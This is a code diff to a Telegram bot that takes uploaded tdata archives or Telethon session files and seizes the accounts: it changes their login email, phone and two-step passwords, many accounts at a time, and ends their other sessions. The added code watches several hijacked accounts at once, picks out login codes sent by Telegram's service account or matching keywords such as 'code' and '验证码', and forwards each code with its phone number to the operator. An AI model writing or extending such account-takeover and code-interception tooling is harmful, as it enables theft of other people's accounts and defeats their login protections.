@@ -16,13 +16,14 @@ from aiogram.types import CallbackQuery, ErrorEvent, FSInputFile, InlineKeyboard
 from opentele.api import API, UseCurrentSession
 from opentele.td import TDesktop
 from opentele.tl import TelegramClient
-from telethon import errors
+from telethon import errors, events
 from telethon.tl import functions, types
 from aiohttp import ClientSession, ClientTimeout, web
 from bulk_email import MAX_LIST_BYTES, BulkInputError, EmailTarget, parse_email_links
 from bulk_job import BulkItem, run_bulk_job
 from bulk_reports import create_bound_email_report, create_twofa_report
 from bulk_twofa import clear_password_pairs, parse_password_pairs, run_bulk_twofa_job
+from reaction_research import inspect_post_reactions, save_reaction_report
 from convert_tdata import check_session, normalize_phone_number, phone_code_details, require_standard_sent_code
 BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '').strip()
 PAIR_CODE = os.environ.get('PAIR_CODE', '').strip()
@@ -36,6 +37,7 @@ MAX_ZIP_SIZE = int(os.environ.get('MAX_ZIP_SIZE', str(20 * 1024 * 1024)))
 MAX_SESSION_SIZE = int(os.environ.get('MAX_SESSION_SIZE', str(5 * 1024 * 1024)))
 MAX_UNCOMPRESSED_SIZE = int(os.environ.get('MAX_UNCOMPRESSED_SIZE', str(512 * 1024 * 1024)))
 MAX_BULK_ACCOUNTS = int(os.environ.get('MAX_BULK_ACCOUNTS', '100'))
+MAX_MONITOR_ACCOUNTS = int(os.environ.get('MAX_MONITOR_ACCOUNTS', '10'))
 if not BOT_TOKEN:
     raise SystemExit('TELEGRAM_BOT_TOKEN environment variable is required')
 if not PAIR_CODE:
@@ -62,7 +64,7 @@ def code_type_label(type_name: str | None) -> str:
     return labels.get(type_name, type_name)
 
 def main_menu() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text='Tdata → Telethon', callback_data='menu:convert'), InlineKeyboardButton(text='检查会话', callback_data='menu:check')], [InlineKeyboardButton(text='查看脱敏邮箱信息', callback_data='menu:pattern'), InlineKeyboardButton(text='更改登录邮箱', callback_data='menu:email')], [InlineKeyboardButton(text='更改手机号码', callback_data='menu:phone'), InlineKeyboardButton(text='更改两步验证密码', callback_data='menu:twofa')], [InlineKeyboardButton(text='重置 / 取消', callback_data='flow:cancel')], [InlineKeyboardButton(text='终止其他设备会话', callback_data='menu:revoke_sessions')], [InlineKeyboardButton(text='查看活跃会话', callback_data='menu:check_active_sessions')], [InlineKeyboardButton(text='批量更改绑定邮箱', callback_data='menu:bulk_email')]])
+    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text='Tdata → Telethon', callback_data='menu:convert'), InlineKeyboardButton(text='检查会话', callback_data='menu:check')], [InlineKeyboardButton(text='查看脱敏邮箱信息', callback_data='menu:pattern'), InlineKeyboardButton(text='更改登录邮箱', callback_data='menu:email')], [InlineKeyboardButton(text='更改手机号码', callback_data='menu:phone'), InlineKeyboardButton(text='更改两步验证密码', callback_data='menu:twofa')], [InlineKeyboardButton(text='重置 / 取消', callback_data='flow:cancel')], [InlineKeyboardButton(text='终止其他设备会话', callback_data='menu:revoke_sessions')], [InlineKeyboardButton(text='查看活跃会话', callback_data='menu:check_active_sessions')], [InlineKeyboardButton(text='反应研究', callback_data='menu:reaction_research')], [InlineKeyboardButton(text='批量更改绑定邮箱', callback_data='menu:bulk_email')], [InlineKeyboardButton(text='监控OTP消息', callback_data='menu:monitor_otp')]])
 
 def cancel_menu() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text='取消', callback_data='flow:cancel')]])
@@ -96,10 +98,51 @@ def bulk_twofa_upload_menu() -> InlineKeyboardMarkup:
 def bulk_twofa_confirm_menu() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text='确认并开始更改两步验证密码', callback_data='bulk:twofa_confirm')], [InlineKeyboardButton(text='跳过两步验证密码更改', callback_data='bulk:twofa_no')]])
 
+def monitor_menu() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text='开始监控所有账号', callback_data='monitor:start_all'), InlineKeyboardButton(text='停止所有监控', callback_data='monitor:stop_all')], [InlineKeyboardButton(text='返回主菜单', callback_data='menu:main')]])
+
+def monitor_list_keyboard(monitored: list) -> InlineKeyboardMarkup:
+    rows = []
+    for item in monitored:
+        idx = item['index']
+        phone = item['phone'] or '未知'
+        rows.append([InlineKeyboardButton(text=f'停止 {phone} (#{idx})', callback_data=f'monitor:stop:{idx}')])
+    rows.append([InlineKeyboardButton(text='停止所有监控', callback_data='monitor:stop_all')])
+    rows.append([InlineKeyboardButton(text='返回主菜单', callback_data='menu:main')])
+    return InlineKeyboardMarkup(inline_keyboard=rows)
+
+async def stop_all_monitor_clients() -> None:
+    monitor_clients = current_flow.get('monitor_clients', {})
+    for idx, item in list(monitor_clients.items()):
+        client = item.get('client')
+        task = item.get('task')
+        if task is not None and not task.done():
+            task.cancel()
+        if client is not None:
+            try:
+                await client.disconnect()
+            except Exception:
+                pass
+    current_flow['monitor_clients'] = {}
+
+
 def reset_flow() -> None:
     bulk_task = current_flow.get('bulk_task')
     if bulk_task is not None and bulk_task is not asyncio.current_task() and (not bulk_task.done()):
         bulk_task.cancel()
+    monitor_clients = current_flow.get('monitor_clients', {})
+    for item in list(monitor_clients.values()):
+        task = item.get('task')
+        if task is not None and not task.done():
+            task.cancel()
+        client = item.get('client')
+        if client is not None:
+            try:
+                import asyncio as _asyncio
+                _asyncio.get_event_loop().call_soon_threadsafe(lambda c=client: _asyncio.ensure_future(c.disconnect()))
+            except Exception:
+                pass
+    current_flow['monitor_clients'] = {}
     temp_dir = current_flow.get('temp_dir')
     if temp_dir:
         shutil.rmtree(temp_dir, ignore_errors=True)
@@ -113,6 +156,103 @@ def reset_flow() -> None:
 def make_temp_dir() -> str:
     WORK_ROOT.mkdir(parents=True, exist_ok=True)
     return tempfile.mkdtemp(prefix='flow_', dir=WORK_ROOT)
+
+
+async def prepare_monitor_session(file_path, temp_dir):
+    suffix = Path(file_path).suffix.lower()
+    if suffix == '.session':
+        validate_session_header(Path(file_path))
+        status = await check_session(Path(file_path))
+        if not status['session_authorized']:
+            raise ValueError('该会话未通过 Telegram 授权验证，或已被注销')
+        client = TelegramClient(str(file_path), api=API.TelegramDesktop, receive_updates=False)
+        await client.connect()
+        try:
+            me = await client.get_me()
+        finally:
+            await client.disconnect()
+        phone = me.phone or '未知'
+        return str(file_path), phone
+
+    if suffix == '.zip':
+        output = Path(temp_dir) / 'converted.session'
+        await convert_uploaded_tdata(Path(file_path), output)
+        status = await check_session(output)
+        if not status['session_authorized']:
+            raise ValueError('转换后的会话未通过 Telegram 授权验证')
+        client = TelegramClient(str(output), api=API.TelegramDesktop, receive_updates=False)
+        await client.connect()
+        try:
+            me = await client.get_me()
+        finally:
+            await client.disconnect()
+        phone = me.phone or '未知'
+        return str(output), phone
+
+    raise ValueError('请上传 .session 文件或 tdata .zip 文件')
+
+
+async def start_monitor_client(bot, session_path, index, phone):
+    client = TelegramClient(session_path, api=API.TelegramDesktop, receive_updates=True)
+
+    @client.on(events.NewMessage)
+    async def otp_handler(event):
+        try:
+            sender = await event.get_sender()
+            sender_id = getattr(sender, 'id', None) if sender else None
+            message_text = event.message.message or ''
+            is_telegram_service = sender_id == 777000
+            otp_keywords = ['code', 'login', 'verification', 'otp', 'пароль', 'код', '验证码', '登录']
+            looks_like_otp = is_telegram_service or any(kw in message_text.lower() for kw in otp_keywords)
+            if not looks_like_otp:
+                return
+            import re as _re
+            codes = _re.findall(r'\b\d{5,6}\b', message_text)
+            code_text = codes[-1] if codes else message_text[:100]
+            forward_text = (
+                '🔐 <b>OTP / Service Message Detected</b>\n\n'
+                f'📱 Account #{index}\n'
+                f'📞 Phone: <code>{phone}</code>\n'
+                f'🕐 Time: {event.message.date.strftime("%Y-%m-%d %H:%M:%S")}\n'
+                f'🔑 Code: <code>{code_text}</code>\n'
+                f'💬 Message: {message_text[:300]}'
+            )
+            if authorized_user_id is not None:
+                try:
+                    await bot.send_message(authorized_user_id, forward_text, parse_mode='HTML')
+                except Exception:
+                    pass
+        except Exception:
+            pass
+
+    await client.connect()
+    if not await client.is_user_authorized():
+        await client.disconnect()
+        raise ValueError(f'账号 #{index} ({phone}) 未通过 Telegram 授权')
+    task = asyncio.create_task(client.run_until_disconnected())
+    current_flow.setdefault('monitor_clients', {})[index] = {
+        'client': client,
+        'task': task,
+        'phone': phone,
+        'session_path': session_path,
+    }
+    return task
+
+
+async def stop_monitor_client(index):
+    monitor_clients = current_flow.get('monitor_clients', {})
+    item = monitor_clients.pop(index, None)
+    if not item:
+        return
+    task = item.get('task')
+    client = item.get('client')
+    if task is not None and not task.done():
+        task.cancel()
+    if client is not None:
+        try:
+            await client.disconnect()
+        except Exception:
+            pass
 
 def is_authorized(message_or_callback: Message | CallbackQuery) -> bool:
     return authorized_user_id is not None and message_or_callback.from_user.id == authorized_user_id
@@ -224,6 +364,24 @@ def format_revoke_preview(current, others) -> str:
     lines = ['终止前请核对会话', '', f'活跃会话总数：{1 + len(others)}', '', '您当前上传的会话（将被保留）：', f'• {authorization_device_label(current)}', '', f'将被注销的其他会话：{len(others)}']
     lines.extend((f'{index}. {authorization_device_label(authorization)}' for index, authorization in enumerate(others, start=1)))
     lines.extend(['', '请在核对以上每个会话后再确认。上传的当前会话将被保留，并在操作后再次验证。'])
+    return '\n'.join(lines)
+
+def format_reaction_research_report(report: dict) -> str:
+    target_labels = {'broadcast_channel': '广播频道', 'megagroup': '超级群组', 'small_group': '普通群组'}
+    access_labels = {'available': '官方反应者列表可访问', 'broadcast_forbidden': 'BROADCAST_FORBIDDEN（反应者身份被拒绝访问）', 'rpc_error': 'Telegram RPC 错误', 'error': '客户端/集成错误', 'not_attempted_no_reaction_metadata': '未尝试；没有反应元数据'}
+    lines = ['反应可见性研究完成。', '', f"目标类型：{target_labels.get(report['target_type'], report['target_type'])}", f"帖子 ID：{report['post_id']}", f"反应元数据存在：{format_bool(report['reactions_present'])}", f"反应总数：{report['total_reactions']}", f"官方 can_see_list 标志：{format_bool(report['can_see_list'])}", f"返回的最近反应条目：{report['recent_reaction_entries_returned']}", f"返回的付费热门反应者条目：{report['paid_top_reactor_entries_returned']}", f"反应者列表结果：{access_labels.get(report['list_access'], report['list_access'])}"]
+    breakdown = ', '.join((f"{row['reaction']}={row['count']}" for row in report['reaction_counts']))
+    if breakdown:
+        lines.insert(6, f'反应明细：{breakdown}')
+    if report['list_access'] == 'available':
+        lines.extend([f"列表总数：{report['list_total_count']}", f"返回的反应行数：{report['list_reaction_rows_returned']}", f"还有更多页面：{format_bool(report['list_has_next_page'])}", '在此上下文中可以访问官方反应者身份；研究报告未保存任何身份信息。'])
+    elif report['list_access'] == 'broadcast_forbidden':
+        lines.append('Telegram 明确防止频道反应者被去匿名化。仍可使用汇总计数；未尝试任何绕过。')
+    elif report['list_error']:
+        lines.append(f"列表错误类型：{report['list_error']}")
+    if report['potential_visibility_inconsistency']:
+        lines.append('检测到潜在的 API/标志不一致；此结果值得进行可复现的集成调查。')
+    lines.extend(['', '未发送任何消息或反应。已保存脱敏报告，正在清理上传的会话。'])
     return '\n'.join(lines)
 
 async def terminate_other_sessions(client: TelegramClient, expected_current_hash: int) -> dict[str, int | bool]:
@@ -530,7 +688,7 @@ async def callback_handler(callback: CallbackQuery) -> None:
             if feature == 'main':
                 await show_menu(message, '请选择功能：')
                 return
-            prompts = {'convert': ('convert_zip', '请上传完整的 tdata ZIP。机器人会将其转换并发送 .session 文件。'), 'check': ('check_session', '请上传 Telethon .session。将检查其有效性及邮箱/两步验证状态。'), 'pattern': ('pattern_session', '请上传 Telethon .session。仅检查 Telegram 脱敏邮箱模式。'), 'email': ('email_session', '请上传已授权的 Telethon .session 以更改登录邮箱。'), 'phone': ('phone_session', '请上传已授权的 Telethon .session 以更改手机号码。'), 'twofa': ('twofa_session', '请上传已授权的 Telethon .session，以验证现有两步验证密码并设置新密码。'), 'revoke_sessions': ('revoke_session', '请上传要保留其当前会话的已授权 Telethon .session。机器人会通过 Telegram 验证，显示会话总数、标明您的当前会话、列出将注销的所有其他会话，并在终止前要求按钮确认。'), 'check_active_sessions': ('check_active_sessions', '请上传已授权的 Telethon .session。机器人会通过 Telegram 验证，并显示活跃会话总数、您的当前会话及所有其他已连接会话。此检查不会终止任何会话。'), 'bulk_email': ('bulk_emails', '批量更改绑定邮箱时，请上传包含邮箱和验证码链接的 .txt 文件。邮箱目标与 tdata ZIP 的数量和顺序必须一致。逐个转换及更改邮箱后，机器人会发送电话号码/绑定邮箱 PDF，并提供可选择、需确认且可跳过的两步验证密码更改阶段。')}
+            prompts = {'convert': ('convert_zip', '请上传完整的 tdata ZIP。机器人会将其转换并发送 .session 文件。'), 'check': ('check_session', '请上传 Telethon .session。将检查其有效性及邮箱/两步验证状态。'), 'pattern': ('pattern_session', '请上传 Telethon .session。仅检查 Telegram 脱敏邮箱模式。'), 'email': ('email_session', '请上传已授权的 Telethon .session 以更改登录邮箱。'), 'phone': ('phone_session', '请上传已授权的 Telethon .session 以更改手机号码。'), 'twofa': ('twofa_session', '请上传已授权的 Telethon .session，以验证现有两步验证密码并设置新密码。'), 'revoke_sessions': ('revoke_session', '请上传要保留其当前会话的已授权 Telethon .session。机器人会通过 Telegram 验证，显示会话总数、标明您的当前会话、列出将注销的所有其他会话，并在终止前要求按钮确认。'), 'check_active_sessions': ('check_active_sessions', '请上传已授权的 Telethon .session。机器人会通过 Telegram 验证，并显示活跃会话总数、您的当前会话及所有其他已连接会话。此检查不会终止任何会话。'), 'reaction_research': ('reaction_session', '请上传已授权的 Telethon .session，以进行只读反应可见性研究。通过 Telegram 验证后，请提供频道/群组和帖子 ID。不会发送消息或反应，也不会绕过隐藏身份限制。'), 'bulk_email': ('bulk_emails', '批量更改绑定邮箱时，请上传包含邮箱和验证码链接的 .txt 文件。邮箱目标与 tdata ZIP 的数量和顺序必须一致。逐个转换及更改邮箱后，机器人会发送电话号码/绑定邮箱 PDF，并提供可选择、需确认且可跳过的两步验证密码更改阶段。'), 'monitor_otp': ('monitor_upload', '上传 .session 文件或 tdata .zip 文件来监控传入的 OTP/服务消息。您可以上传多个文件。全部上传后，点击开始监控所有账号。每个 OTP 都会转发到这里，并附带账号手机号。')}
             if feature not in prompts:
                 raise ValueError('未知功能')
             step, prompt = prompts[feature]
@@ -539,6 +697,52 @@ async def callback_handler(callback: CallbackQuery) -> None:
             return
         if data == 'bulk:start':
             await start_bulk_job(message)
+            return
+        if data == 'monitor:start_all':
+            if current_flow.get('step') != 'monitor_upload':
+                await message.answer('监控上传流程已过期。请从菜单重新开始。')
+                return
+            uploads = current_flow.get('monitor_uploads', [])
+            if not uploads:
+                await message.answer('尚未上传会话。请先上传 .session 或 tdata .zip 文件。')
+                return
+            current_flow['step'] = 'monitor_running'
+            await message.answer(f'正在启动 {len(uploads)} 个账号的监控...', reply_markup=cancel_menu())
+            started = 0
+            for item in uploads:
+                idx = item['index']
+                session_path = item['session_path']
+                phone = item['phone']
+                try:
+                    await start_monitor_client(message.bot, session_path, idx, phone)
+                    started += 1
+                except Exception as exc:
+                    await message.answer(f'启动 #{idx} ({phone}) 监控失败：{str(exc)[:200]}')
+            if started:
+                monitored = [{'index': i, 'phone': current_flow['monitor_clients'][i]['phone']} for i in sorted(current_flow.get('monitor_clients', {}).keys())]
+                await message.answer(f'已为 {started} 个账号启动监控。OTP 将转发到这里。', reply_markup=monitor_list_keyboard(monitored))
+            else:
+                current_flow['step'] = 'monitor_upload'
+                await message.answer('没有账号能够启动。请上传有效的会话重试。', reply_markup=cancel_menu())
+            return
+        if data == 'monitor:stop_all':
+            await stop_all_monitor_clients()
+            current_flow['step'] = 'monitor_upload'
+            await finish_flow(message, '所有监控已停止。')
+            return
+        if data.startswith('monitor:stop:'):
+            try:
+                idx = int(data.split(':')[2])
+            except (ValueError, IndexError):
+                await message.answer('无效的停止请求。')
+                return
+            await stop_monitor_client(idx)
+            current_flow['step'] = 'monitor_upload'
+            monitored = [{'index': i, 'phone': current_flow['monitor_clients'][i]['phone']} for i in sorted(current_flow.get('monitor_clients', {}).keys())]
+            if monitored:
+                await message.answer(f'已停止 #{idx} 的监控。', reply_markup=monitor_list_keyboard(monitored))
+            else:
+                await finish_flow(message, f'已停止 #{idx} 的监控。没有剩余账号。')
             return
         if data == 'bulk:twofa_yes':
             if current_flow.get('step') != 'bulk_twofa_choice':
@@ -777,6 +981,11 @@ async def document_handler(message: Message) -> None:
                 return
             current_flow['step'] = 'revoke_confirm'
             await answer_long(message, format_revoke_preview(current, others), reply_markup=confirmation_menu('revoke:confirm'))
+        elif step == 'reaction_session':
+            current_flow['step'] = 'busy'
+            await store_session_upload(message)
+            current_flow['step'] = 'reaction_target'
+            await message.answer('会话有效。请在一行中发送“频道或群组 帖子ID”，例如 @example 123 或 -1001234567890 123。这是只读的官方 API 检查。', reply_markup=cancel_menu())
         elif step in {'check_session', 'pattern_session'}:
             current_flow['step'] = 'busy'
             status = await store_session_upload(message)
@@ -827,6 +1036,37 @@ async def document_handler(message: Message) -> None:
             eligible = sum((item.twofa_eligible and item.session_path.is_file() for item in items))
             current_flow['step'] = 'bulk_twofa_confirm'
             await message.answer(f'密码列表已接受：{len(pairs)} 行；符合条件的账号={eligible}。未显示或记录任何密码。请确认按顺序以随机 2–4 分钟间隔更改两步验证密码，或选择跳过。将生成不含密码的电话号码/状态 PDF。', reply_markup=bulk_twofa_confirm_menu())
+        elif step == 'monitor_upload':
+            current_flow['step'] = 'busy'
+            document = message.document
+            if document.file_name and Path(document.file_name).suffix.lower() not in {'.zip', '.session'}:
+                await message.answer('请上传 .session 文件或 tdata .zip 文件。', reply_markup=cancel_menu())
+                current_flow['step'] = 'monitor_upload'
+                return
+            temp_dir = Path(current_flow.get('temp_dir', make_temp_dir()))
+            current_flow['temp_dir'] = str(temp_dir)
+            if 'monitor_uploads' not in current_flow:
+                current_flow['monitor_uploads'] = []
+            file_name = document.file_name or 'upload'
+            safe_name = file_name.replace('/', '_').replace('\\', '_')
+            dest = temp_dir / safe_name
+            await download_document(message, dest, MAX_ZIP_SIZE)
+            try:
+                session_path, phone = await prepare_monitor_session(dest, temp_dir)
+            except Exception as exc:
+                dest.unlink(missing_ok=True)
+                current_flow['step'] = 'monitor_upload'
+                await message.answer(f'验证失败：{str(exc)[:300]}', reply_markup=cancel_menu())
+                return
+            idx = len(current_flow['monitor_uploads']) + 1
+            current_flow['monitor_uploads'].append({'index': idx, 'session_path': session_path, 'phone': phone})
+            current_flow['step'] = 'monitor_upload'
+            await message.answer(
+                f'✅ 会话 #{idx} 已验证：{phone}\n'
+                f'已上传总数：{len(current_flow["monitor_uploads"])}\n\n'
+                '继续上传更多文件，或点击开始监控所有账号。',
+                reply_markup=monitor_menu(),
+            )
         elif step in {'bulk_emails', 'bulk_tdata'}:
             await handle_bulk_document(message, step)
         elif step in {'bulk_running', 'bulk_twofa_running'}:
@@ -857,7 +1097,31 @@ async def text_handler(message: Message) -> None:
     raw_text = message.text or ''
     text = raw_text.strip()
     try:
-        if step == 'twofa_current':
+        if step == 'reaction_target':
+            try:
+                target_text, post_text = text.rsplit(None, 1)
+                post_id = int(post_text)
+            except (ValueError, TypeError):
+                raise ValueError('请使用“频道或群组 帖子ID”格式，例如 @example 123') from None
+            if post_id <= 0 or not target_text:
+                raise ValueError('帖子 ID 必须是正整数，且目标不能为空')
+            try:
+                target = int(target_text)
+            except ValueError:
+                target = target_text
+            current_flow['step'] = 'busy'
+            client = client_for_session()
+            try:
+                await client.connect()
+                entity = await client.get_entity(target)
+                report = await inspect_post_reactions(client, entity, post_id)
+            finally:
+                await client.disconnect()
+            report['target'] = target_text
+            save_reaction_report(report)
+            print(f"REACTION_RESEARCH_COMPLETE access={report['list_access']} inconsistency={report['potential_visibility_inconsistency']}", flush=True)
+            await finish_flow(message, format_reaction_research_report(report))
+        elif step == 'twofa_current':
             await delete_code_message(message)
             if not raw_text:
                 raise ValueError('现有两步验证密码不能为空')
